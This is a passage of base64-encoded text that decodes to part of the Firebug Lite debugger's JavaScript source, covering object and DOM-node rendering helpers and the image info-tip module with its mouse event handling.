KICAgICAgICB7DQogICAgICAgICAgICBpZiAob2JqZWN0ID09IHVuZGVmaW5lZCkNCiAgICAgICAgICAgICAgICB0aGlzLmFwcGVuZE51bGwoInVuZGVmaW5lZCIsIGh0bWwpOw0KICAgICAgICAgICAgZWxzZSBpZiAob2JqZWN0ID09IG51bGwpDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmROdWxsKCJudWxsIiwgaHRtbCk7DQogICAgICAgICAgICBlbHNlIGlmICh0eXBlb2Ygb2JqZWN0ID09ICJzdHJpbmciKQ0KICAgICAgICAgICAgICAgIHRoaXMuYXBwZW5kU3RyaW5nKG9iamVjdCwgaHRtbCk7DQogICAgICAgICAgICBlbHNlIGlmICh0eXBlb2Ygb2JqZWN0ID09ICJudW1iZXIiKQ0KICAgICAgICAgICAgICAgIHRoaXMuYXBwZW5kSW50ZWdlcihvYmplY3QsIGh0bWwpOw0KICAgICAgICAgICAgZWxzZSBpZiAodHlwZW9mIG9iamVjdCA9PSAiYm9vbGVhbiIpDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRJbnRlZ2VyKG9iamVjdCwgaHRtbCk7DQogICAgICAgICAgICBlbHNlIGlmICh0eXBlb2Ygb2JqZWN0ID09ICJmdW5jdGlvbiIpDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRGdW5jdGlvbihvYmplY3QsIGh0bWwpOw0KICAgICAgICAgICAgZWxzZSBpZiAob2JqZWN0Lm5vZGVUeXBlID09IDEpDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRTZWxlY3RvcihvYmplY3QsIGh0bWwpOw0KICAgICAgICAgICAgZWxzZSBpZiAodHlwZW9mIG9iamVjdCA9PSAib2JqZWN0IikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAodHlwZW9mIG9iamVjdC5sZW5ndGggIT0gInVuZGVmaW5lZCIpDQogICAgICAgICAgICAgICAgICAgIHRoaXMuYXBwZW5kQXJyYXkob2JqZWN0LCBodG1sKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHRoaXMuYXBwZW5kT2JqZWN0Rm9ybWF0dGVkKG9iamVjdCwgaHRtbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgdGhpcy5hcHBlbmRUZXh0KG9iamVjdCwgaHRtbCk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKGV4YykNCiAgICAgICAgew0KICAgICAgICB9DQogICAgICAgIC8qKi8NCiAgICB9LA0KICAgICAgICANCiAgICBhcHBlbmRPYmplY3RGb3JtYXR0ZWQ6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIHZhciB0ZXh0ID0gb2JqZWN0VG9TdHJpbmcob2JqZWN0KTsNCiAgICAgICAgdmFyIHJlT2JqZWN0ID0gL1xbb2JqZWN0ICguKj8pXF0vOw0KICAgIA0KICAgICAgICB2YXIgbSA9IHJlT2JqZWN0LmV4ZWModGV4dCk7DQogICAgICAgIGh0bWwucHVzaCgnPHNwYW4gY2xhc3M9Im9iamVjdEJveC1vYmplY3QiPicsIG0gPyBtWzFdIDogdGV4dCwgJzwvc3Bhbj4nKTsNCiAgICB9LA0KICAgIA0KICAgIGFwcGVuZFNlbGVjdG9yOiBmdW5jdGlvbihvYmplY3QsIGh0bWwpDQogICAgew0KICAgICAgICB2YXIgdWlkID0gRWxlbWVudENhY2hlKG9iamVjdCk7DQogICAgICAgIHZhciB1aWRTdHJpbmcgPSB1aWQgPyBbY2FjaGVJRCwgJz0iJywgdWlkLCAnIiddLmpvaW4oIiIpIDogIiI7DQogICAgICAgIA0KICAgICAgICBodG1sLnB1c2goJzxzcGFuIGNsYXNzPSJvYmplY3RCb3gtc2VsZWN0b3IiJywgdWlkU3RyaW5nLCAnPicpOw0KICAgIA0KICAgICAgICBodG1sLnB1c2goJzxzcGFuIGNsYXNzPSJzZWxlY3RvclRhZyI+JywgZXNjYXBlSFRNTChvYmplY3Qubm9kZU5hbWUudG9Mb3dlckNhc2UoKSksICc8L3NwYW4+Jyk7DQogICAgICAgIGlmIChvYmplY3QuaWQpDQogICAgICAgICAgICBodG1sLnB1c2goJzxzcGFuIGNsYXNzPSJzZWxlY3RvcklkIj4jJywgZXNjYXBlSFRNTChvYmplY3QuaWQpLCAnPC9zcGFuPicpOw0KICAgICAgICBpZiAob2JqZWN0LmNsYXNzTmFtZSkNCiAgICAgICAgICAgIGh0bWwucHVzaCgnPHNwYW4gY2xhc3M9InNlbGVjdG9yQ2xhc3MiPi4nLCBlc2NhcGVIVE1MKG9iamVjdC5jbGFzc05hbWUpLCAnPC9zcGFuPicpOw0KICAgIA0KICAgICAgICBodG1sLnB1c2goJzwvc3Bhbj4nKTsNCiAgICB9LA0KICAgIA0KICAgIGFwcGVuZE5vZGU6IGZ1bmN0aW9uKG5vZGUsIGh0bWwpDQogICAgew0KICAgICAgICBpZiAobm9kZS5ub2RlVHlwZSA9PSAxKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgdWlkID0gRWxlbWVudENhY2hlKG5vZGUpOw0KICAgICAgICAgICAgdmFyIHVpZFN0cmluZyA9IHVpZCA/IFtjYWNoZUlELCAnPSInLCB1aWQsICciJ10uam9pbigiIikgOiAiIjsgICAgICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGh0bWwucHVzaCgNCiAgICAgICAgICAgICAgICAnPGRpdiBjbGFzcz0ib2JqZWN0Qm94LWVsZW1lbnQiJywgdWlkU3RyaW5nLCAnIj4nLA0KICAgICAgICAgICAgICAgICc8c3BhbiAnLCBjYWNoZUlELCAnPSInLCB1aWQsICciIGNsYXNzPSJub2RlQm94Ij4nLA0KICAgICAgICAgICAgICAgICcmbHQ7PHNwYW4gY2xhc3M9Im5vZGVUYWciPicsIG5vZGUubm9kZU5hbWUudG9Mb3dlckNhc2UoKSwgJzwvc3Bhbj4nKTsNCiAgICANCiAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbm9kZS5hdHRyaWJ1dGVzLmxlbmd0aDsgKytpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBhdHRyID0gbm9kZS5hdHRyaWJ1dGVzW2ldOw0KICAgICAgICAgICAgICAgIGlmICghYXR0ci5zcGVjaWZpZWQgfHwgYXR0ci5ub2RlTmFtZSA9PSBjYWNoZUlEKQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB2YXIgbmFtZSA9IGF0dHIubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgICAgICAgICB2YXIgdmFsdWUgPSBuYW1lID09ICJzdHlsZSIgPyBub2RlLnN0eWxlLmNzc1RleHQgOiBhdHRyLm5vZGVWYWx1ZTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBodG1sLnB1c2goJyZuYnNwOzxzcGFuIGNsYXNzPSJub2RlTmFtZSI+JywgbmFtZSwNCiAgICAgICAgICAgICAgICAgICAgJzwvc3Bhbj49JnF1b3Q7PHNwYW4gY2xhc3M9Im5vZGVWYWx1ZSI+JywgZXNjYXBlSFRNTCh2YWx1ZSksDQogICAgICAgICAgICAgICAgICAgICc8L3NwYW4+JnF1b3Q7Jyk7DQogICAgICAgICAgICB9DQogICAgDQogICAgICAgICAgICBpZiAobm9kZS5maXJzdENoaWxkKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnJmd0OzwvZGl2PjxkaXYgY2xhc3M9Im5vZGVDaGlsZHJlbiI+Jyk7DQogICAgDQogICAgICAgICAgICAgICAgZm9yICh2YXIgY2hpbGQgPSBub2RlLmZpcnN0Q2hpbGQ7IGNoaWxkOyBjaGlsZCA9IGNoaWxkLm5leHRTaWJsaW5nKQ0KICAgICAgICAgICAgICAgICAgICB0aGlzLmFwcGVuZE5vZGUoY2hpbGQsIGh0bWwpOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBodG1sLnB1c2goJzwvZGl2PjxkaXYgY2xhc3M9Im9iamVjdEJveC1lbGVtZW50Ij4mbHQ7LzxzcGFuIGNsYXNzPSJub2RlVGFnIj4nLCANCiAgICAgICAgICAgICAgICAgICAgbm9kZS5ub2RlTmFtZS50b0xvd2VyQ2FzZSgpLCAnJmd0Ozwvc3Bhbj48L3NwYW4+PC9kaXY+Jyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgaHRtbC5wdXNoKCcvJmd0Ozwvc3Bhbj48L2Rpdj4nKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIGlmIChub2RlLm5vZGVUeXBlID09IDMpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB2YWx1ZSA9IHRyaW0obm9kZS5ub2RlVmFsdWUpOw0KICAgICAgICAgICAgaWYgKHZhbHVlKQ0KICAgICAgICAgICAgICAgIGh0bWwucHVzaCgnPGRpdiBjbGFzcz0ibm9kZVRleHQiPicsIGVzY2FwZUhUTUwodmFsdWUpLCc8L2Rpdj4nKTsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgYXBwZW5kQXJyYXk6IGZ1bmN0aW9uKG9iamVjdCwgaHRtbCkNCiAgICB7DQogICAgICAgIGh0bWwucHVzaCgnPHNwYW4gY2xhc3M9Im9iamVjdEJveC1hcnJheSI+PGI+WzwvYj4gJyk7DQogICAgICAgIA0KICAgICAgICBmb3IgKHZhciBpID0gMCwgbCA9IG9iamVjdC5sZW5ndGgsIG9iajsgaSA8IGw7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdGhpcy5hcHBlbmRPYmplY3Qob2JqZWN0W2ldLCBodG1sKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGkgPCBsLTEpDQogICAgICAgICAgICBodG1sLnB1c2goJywgJyk7DQogICAgICAgIH0NCiAgICANCiAgICAgICAgaHRtbC5wdXNoKCcgPGI+XTwvYj48L3NwYW4+Jyk7DQogICAgfQ0KDQp9Ow0KDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQp9fSk7DQoNCi8qIFNlZSBsaWNlbnNlLnR4dCBmb3IgdGVybXMgb2YgdXNhZ2UgKi8NCg0KLyoNCg0KSGFjazoNCkZpcmVidWcuY2hyb21lLmN1cnJlbnRQYW5lbCA9IEZpcmVidWcuY2hyb21lLnNlbGVjdGVkUGFuZWw7IA0KRmlyZWJ1Zy5zaG93SW5mb1RpcHMgPSB0cnVlOyANCkZpcmVidWcuSW5mb1RpcC5pbml0aWFsaXplQnJvd3NlcihGaXJlYnVnLmNocm9tZSk7DQoNCi8qKi8NCg0KRkJMLm5zKGZ1bmN0aW9uKCkgeyB3aXRoIChGQkwpIHsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBDb25zdGFudHMNCg0KdmFyIG1heFdpZHRoID0gMTAwLCBtYXhIZWlnaHQgPSA4MDsNCnZhciBpbmZvVGlwTWFyZ2luID0gMTA7DQp2YXIgaW5mb1RpcFdpbmRvd1BhZGRpbmcgPSAyNTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCkZpcmVidWcuSW5mb1RpcCA9IGV4dGVuZChGaXJlYnVnLk1vZHVsZSwNCnsNCiAgICBkaXNwYXRjaE5hbWU6ICJpbmZvVGlwIiwNCiAgICB0YWdzOiBkb21wbGF0ZSgNCiAgICB7DQogICAgICAgIGluZm9UaXBUYWc6IERJVih7ImNsYXNzIjogImluZm9UaXAifSksDQoNCiAgICAgICAgY29sb3JUYWc6DQogICAgICAgICAgICBESVYoe3N0eWxlOiAiYmFja2dyb3VuZDogJHJnYlZhbHVlOyB3aWR0aDogMTAwcHg7IGhlaWdodDogNDBweCJ9LCAiJm5ic3A7IiksDQoNCiAgICAgICAgaW1nVGFnOg0KICAgICAgICAgICAgRElWKHsiY2xhc3MiOiAiaW5mb1RpcEltYWdlQm94IGluZm9UaXBMb2FkaW5nIn0sDQogICAgICAgICAgICAgICAgSU1HKHsiY2xhc3MiOiAiaW5mb1RpcEltYWdlIiwgc3JjOiAiJHVybFZhbHVlIiwgcmVwZWF0OiAiJHJlcGVhdCIsDQogICAgICAgICAgICAgICAgICAgIG9ubG9hZDogIiRvbkxvYWRJbWFnZSJ9KSwNCiAgICAgICAgICAgICAgICBJTUcoeyJjbGFzcyI6ICJpbmZvVGlwQmdJbWFnZSIsIGNvbGxhcHNlZDogdHJ1ZSwgc3JjOiAiYmxhbmsuZ2lmIn0pLA0KICAgICAgICAgICAgICAgIERJVih7ImNsYXNzIjogImluZm9UaXBDYXB0aW9uIn0pDQogICAgICAgICAgICApLA0KDQogICAgICAgIG9uTG9hZEltYWdlOiBmdW5jdGlvbihldmVudCkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIGltZyA9IGV2ZW50LmN1cnJlbnRUYXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudDsNCiAgICAgICAgICAgIC8vL3ZhciBiZ0ltZyA9IGltZy5uZXh0U2libGluZzsNCiAgICAgICAgICAgIC8vL2lmICghYmdJbWcpDQogICAgICAgICAgICAvLy8gICAgcmV0dXJuOyAvLyBTb21ldGltZXMgZ2V0cyBjYWxsZWQgYWZ0ZXIgZWxlbWVudCBpcyBkZWFkDQoNCiAgICAgICAgICAgIC8vL3ZhciBjYXB0aW9uID0gYmdJbWcubmV4dFNpYmxpbmc7DQogICAgICAgICAgICB2YXIgaW5uZXJCb3ggPSBpbWcucGFyZW50Tm9kZTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8vIFRPRE86IHh4eHBlZHJvIGluZm9UaXAgaGFjaw0KICAgICAgICAgICAgdmFyIGNhcHRpb24gPSBnZXRFbGVtZW50QnlDbGFzcyhpbm5lckJveCwgImluZm9UaXBDYXB0aW9uIik7DQogICAgICAgICAgICB2YXIgYmdJbWcgPSBnZXRFbGVtZW50QnlDbGFzcyhpbm5lckJveCwgImluZm9UaXBCZ0ltYWdlIik7DQogICAgICAgICAgICBpZiAoIWJnSW1nKQ0KICAgICAgICAgICAgICAgIHJldHVybjsgLy8gU29tZXRpbWVzIGdldHMgY2FsbGVkIGFmdGVyIGVsZW1lbnQgaXMgZGVhZA0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBpbmZvVGlwIElFIGFuZCB0aW1pbmcgaXNzdWUNCiAgICAgICAgICAgIC8vIFRPRE86IHVzZSBvZmZsaW5lIGRvY3VtZW50IHRvIGF2b2lkIGZsaWNrZXJpbmcNCiAgICAgICAgICAgIGlmIChpc0lFKQ0KICAgICAgICAgICAgICAgIHJlbW92ZUNsYXNzKGlubmVyQm94LCAiaW5mb1RpcExvYWRpbmciKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHVwZGF0ZUluZm9UaXAgPSBmdW5jdGlvbigpew0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgdyA9IGltZy5uYXR1cmFsV2lkdGggfHwgaW1nLndpZHRoIHx8IDEwLCANCiAgICAgICAgICAgICAgICBoID0gaW1nLm5hdHVyYWxIZWlnaHQgfHwgaW1nLmhlaWdodCB8fCAxMDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHJlcGVhdCA9IGltZy5nZXRBdHRyaWJ1dGUoInJlcGVhdCIpOw0KDQogICAgICAgICAgICBpZiAocmVwZWF0ID09ICJyZXBlYXQteCIgfHwgKHcgPT0gMSAmJiBoID4gMSkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY29sbGFwc2UoaW1nLCB0cnVlKTsNCiAgICAgICAgICAgICAgICBjb2xsYXBzZShiZ0ltZywgZmFsc2UpOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLmJhY2tncm91bmQgPSAidXJsKCIgKyBpbWcuc3JjICsgIikgcmVwZWF0LXgiOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLndpZHRoID0gbWF4V2lkdGggKyAicHgiOw0KICAgICAgICAgICAgICAgIGlmIChoID4gbWF4SGVpZ2h0KQ0KICAgICAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS5oZWlnaHQgPSBtYXhIZWlnaHQgKyAicHgiOw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuaGVpZ2h0ID0gaCArICJweCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChyZXBlYXQgPT0gInJlcGVhdC15IiB8fCAoaCA9PSAxICYmIHcgPiAxKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjb2xsYXBzZShpbWcsIHRydWUpOw0KICAgICAgICAgICAgICAgIGNvbGxhcHNlKGJnSW1nLCBmYWxzZSk7DQogICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuYmFja2dyb3VuZCA9ICJ1cmwoIiArIGltZy5zcmMgKyAiKSByZXBlYXQteSI7DQogICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuaGVpZ2h0ID0gbWF4SGVpZ2h0ICsgInB4IjsNCiAgICAgICAgICAgICAgICBpZiAodyA+IG1heFdpZHRoKQ0KICAgICAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS53aWR0aCA9IG1heFdpZHRoICsgInB4IjsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLndpZHRoID0gdyArICJweCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIGlmIChyZXBlYXQgPT0gInJlcGVhdCIgfHwgKHcgPT0gMSAmJiBoID09IDEpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNvbGxhcHNlKGltZywgdHJ1ZSk7DQogICAgICAgICAgICAgICAgY29sbGFwc2UoYmdJbWcsIGZhbHNlKTsNCiAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS5iYWNrZ3JvdW5kID0gInVybCgiICsgaW1nLnNyYyArICIpIHJlcGVhdCI7DQogICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUud2lkdGggPSBtYXhXaWR0aCArICJweCI7DQogICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuaGVpZ2h0ID0gbWF4SGVpZ2h0ICsgInB4IjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAodyA+IG1heFdpZHRoIHx8IGggPiBtYXhIZWlnaHQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAodyA+IGgpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGltZy5zdHlsZS53aWR0aCA9IG1heFdpZHRoICsgInB4IjsNCiAgICAgICAgICAgICAgICAgICAgICAgIGltZy5zdHlsZS5oZWlnaHQgPSBNYXRoLnJvdW5kKChoIC8gdykgKiBtYXhXaWR0aCkgKyAicHgiOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaW1nLnN0eWxlLndpZHRoID0gTWF0aC5yb3VuZCgodyAvIGgpICogbWF4SGVpZ2h0KSArICJweCI7DQogICAgICAgICAgICAgICAgICAgICAgICBpbWcuc3R5bGUuaGVpZ2h0ID0gbWF4SGVpZ2h0ICsgInB4IjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy9jYXB0aW9uLmlubmVySFRNTCA9ICRTVFJGKCJEaW1lbnNpb25zIiwgW3csIGhdKTsNCiAgICAgICAgICAgIGNhcHRpb24uaW5uZXJIVE1MID0gJFNUUkYodyArICIgeCAiICsgaCk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKGlzSUUpIA0KICAgICAgICAgICAgICAgIHNldFRpbWVvdXQodXBkYXRlSW5mb1RpcCwgMCk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdXBkYXRlSW5mb1RpcCgpOw0KICAgICAgICAgICAgICAgIHJlbW92ZUNsYXNzKGlubmVyQm94LCAiaW5mb1RpcExvYWRpbmciKTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLy8vDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIC8qDQogICAgICAgIC8vLyBvbkxvYWRJbWFnZSBvcmlnaW5hbA0KICAgICAgICBvbkxvYWRJbWFnZTogZnVuY3Rpb24oZXZlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBpbWcgPSBldmVudC5jdXJyZW50VGFyZ2V0Ow0KICAgICAgICAgICAgdmFyIGJnSW1nID0gaW1nLm5leHRTaWJsaW5nOw0KICAgICAgICAgICAgaWYgKCFiZ0ltZykNCiAgICAgICAgICAgICAgICByZXR1cm47IC8vIFNvbWV0aW1lcyBnZXRzIGNhbGxlZCBhZnRlciBlbGVtZW50IGlzIGRlYWQNCg0KICAgICAgICAgICAgdmFyIGNhcHRpb24gPSBiZ0ltZy5uZXh0U2libGluZzsNCiAgICAgICAgICAgIHZhciBpbm5lckJveCA9IGltZy5wYXJlbnROb2RlOw0KDQogICAgICAgICAgICB2YXIgdyA9IGltZy5uYXR1cmFsV2lkdGgsIGggPSBpbWcubmF0dXJhbEhlaWdodDsNCiAgICAgICAgICAgIHZhciByZXBlYXQgPSBpbWcuZ2V0QXR0cmlidXRlKCJyZXBlYXQiKTsNCg0KICAgICAgICAgICAgaWYgKHJlcGVhdCA9PSAicmVwZWF0LXgiIHx8ICh3ID09IDEgJiYgaCA+IDEpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNvbGxhcHNlKGltZywgdHJ1ZSk7DQogICAgICAgICAgICAgICAgY29sbGFwc2UoYmdJbWcsIGZhbHNlKTsNCiAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS5iYWNrZ3JvdW5kID0gInVybCgiICsgaW1nLnNyYyArICIpIHJlcGVhdC14IjsNCiAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS53aWR0aCA9IG1heFdpZHRoICsgInB4IjsNCiAgICAgICAgICAgICAgICBpZiAoaCA+IG1heEhlaWdodCkNCiAgICAgICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuaGVpZ2h0ID0gbWF4SGVpZ2h0ICsgInB4IjsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLmhlaWdodCA9IGggKyAicHgiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAocmVwZWF0ID09ICJyZXBlYXQteSIgfHwgKGggPT0gMSAmJiB3ID4gMSkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY29sbGFwc2UoaW1nLCB0cnVlKTsNCiAgICAgICAgICAgICAgICBjb2xsYXBzZShiZ0ltZywgZmFsc2UpOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLmJhY2tncm91bmQgPSAidXJsKCIgKyBpbWcuc3JjICsgIikgcmVwZWF0LXkiOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLmhlaWdodCA9IG1heEhlaWdodCArICJweCI7DQogICAgICAgICAgICAgICAgaWYgKHcgPiBtYXhXaWR0aCkNCiAgICAgICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUud2lkdGggPSBtYXhXaWR0aCArICJweCI7DQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBiZ0ltZy5zdHlsZS53aWR0aCA9IHcgKyAicHgiOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSBpZiAocmVwZWF0ID09ICJyZXBlYXQiIHx8ICh3ID09IDEgJiYgaCA9PSAxKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjb2xsYXBzZShpbWcsIHRydWUpOw0KICAgICAgICAgICAgICAgIGNvbGxhcHNlKGJnSW1nLCBmYWxzZSk7DQogICAgICAgICAgICAgICAgYmdJbWcuc3R5bGUuYmFja2dyb3VuZCA9ICJ1cmwoIiArIGltZy5zcmMgKyAiKSByZXBlYXQiOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLndpZHRoID0gbWF4V2lkdGggKyAicHgiOw0KICAgICAgICAgICAgICAgIGJnSW1nLnN0eWxlLmhlaWdodCA9IG1heEhlaWdodCArICJweCI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgaWYgKHcgPiBtYXhXaWR0aCB8fCBoID4gbWF4SGVpZ2h0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHcgPiBoKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpbWcuc3R5bGUud2lkdGggPSBtYXhXaWR0aCArICJweCI7DQogICAgICAgICAgICAgICAgICAgICAgICBpbWcuc3R5bGUuaGVpZ2h0ID0gTWF0aC5yb3VuZCgoaCAvIHcpICogbWF4V2lkdGgpICsgInB4IjsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGltZy5zdHlsZS53aWR0aCA9IE1hdGgucm91bmQoKHcgLyBoKSAqIG1heEhlaWdodCkgKyAicHgiOw0KICAgICAgICAgICAgICAgICAgICAgICAgaW1nLnN0eWxlLmhlaWdodCA9IG1heEhlaWdodCArICJweCI7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIGNhcHRpb24uaW5uZXJIVE1MID0gJFNUUkYoIkRpbWVuc2lvbnMiLCBbdywgaF0pOw0KDQogICAgICAgICAgICByZW1vdmVDbGFzcyhpbm5lckJveCwgImluZm9UaXBMb2FkaW5nIik7DQogICAgICAgIH0NCiAgICAgICAgLyoqLw0KICAgICAgICANCiAgICB9KSwNCg0KICAgIGluaXRpYWxpemVCcm93c2VyOiBmdW5jdGlvbihicm93c2VyKQ0KICAgIHsNCiAgICAgICAgYnJvd3Nlci5vbkluZm9UaXBNb3VzZU91dCA9IGJpbmQodGhpcy5vbk1vdXNlT3V0LCB0aGlzLCBicm93c2VyKTsNCiAgICAgICAgYnJvd3Nlci5vbkluZm9UaXBNb3VzZU1vdmUgPSBiaW5kKHRoaXMub25Nb3VzZU1vdmUsIHRoaXMsIGJyb3dzZXIpOw0KDQogICAgICAgIC8vL3ZhciBkb2MgPSBicm93c2VyLmNvbnRlbnREb2N1bWVudDsNCiAgICAgICAgdmFyIGRvYyA9IGJyb3dzZXIuZG9jdW1lbnQ7DQogICAgICAgIGlmICghZG9jKQ0KICAgICAgICAgICAgcmV0dXJuOw0KDQogICAgICAgIC8vL2RvYy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZSwgdHJ1ZSk7DQogICAgICAgIC8vL2RvYy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGJyb3dzZXIub25JbmZvVGlwTW91c2VPdXQsIHRydWUpOw0KICAgICAgICAvLy9kb2MuYWRkRXZlbnRMaXN0ZW5lcigibW91c2Vtb3ZlIiwgYnJvd3Nlci5vbkluZm9UaXBNb3VzZU1vdmUsIHRydWUpOw0KICAgICAgICBhZGRFdmVudChkb2MsICJtb3VzZW92ZXIiLCBicm93c2VyLm9uSW5mb1RpcE1vdXNlTW92ZSk7DQogICAgICAgIGFkZEV2ZW50KGRvYywgIm1vdXNlb3V0IiwgYnJvd3Nlci5vbkluZm9UaXBNb3VzZU91dCk7DQogICAgICAgIGFkZEV2ZW50KGRvYywgIm1vdXNlbW92ZSIsIGJyb3dzZXIub25JbmZvVGlwTW91c2VNb3ZlKTsNCiAgICAgICAgDQogICAgICAgIHJldHVybiBicm93c2VyLmluZm9UaXAgPSB0aGlzLnRhZ3MuaW5mb1RpcFRhZy5hcHBlbmQoe30sIGdldEJvZHkoZG9jKSk7DQogICAgfSwNCg0KICAgIHVuaW5pdGlhbGl6ZUJyb3dzZXI6IGZ1bmN0aW9uKGJyb3dzZXIpDQogICAgew0KICAgICAgICBpZiAoYnJvd3Nlci5pbmZvVGlwKQ0KICAgICAgICB7DQogICAgICAgICAgICAvLy92YXIgZG9jID0gYnJvd3Nlci5jb250ZW50RG9jdW1lbnQ7DQogICAgICAgICAgICB2YXIgZG9jID0gYnJvd3Nlci5kb2N1bWVudDsNCiAgICAgICAgICAgIC8